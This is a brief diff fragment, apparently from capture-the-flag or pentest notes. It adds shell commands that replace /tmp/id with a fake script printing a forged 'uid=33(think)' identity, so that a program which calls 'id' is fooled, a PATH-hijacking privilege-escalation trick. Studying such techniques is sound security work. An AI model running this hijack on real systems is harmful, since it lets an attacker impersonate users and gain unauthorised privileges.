@@ -664,3 +664,9 @@ ls -l /tmp/id
 [!] Running 'id' command to extract the username and user ID (UID)
 [-] Error reading username from id command
 : Success
+
+rm -f /tmp/id
+echo '#!/bin/bash' > /tmp/id
+echo 'echo "uid=33(think) gid=33(think) groups=33(think)"' >> /tmp/id
+chmod +x /tmp/id
+
